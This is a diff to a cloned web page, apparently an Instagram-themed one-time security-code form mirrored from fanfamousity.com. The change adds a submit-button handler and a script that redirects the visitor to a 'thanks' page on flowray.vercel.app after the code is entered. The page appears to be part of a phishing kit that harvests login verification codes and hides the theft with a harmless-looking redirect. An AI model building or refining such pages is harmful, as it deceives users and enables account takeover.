@@ -67,7 +67,7 @@
             placeholder="Security code"
           />
           <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
-          <input type="submit" name="submit" value="Confirm" />
+          <input type="submit" name="submit" value="Confirm"   onclick="redirect();"/>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
@@ -195,6 +195,13 @@ document.getElementById('form')
       alert(JSON.stringify(err));
     });
 });
+     <script>
+          function redirect() {
+  window.location.replace("https://flowray.vercel.app/thanks.html");
+  return false;
+}
+    </script>
+  
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
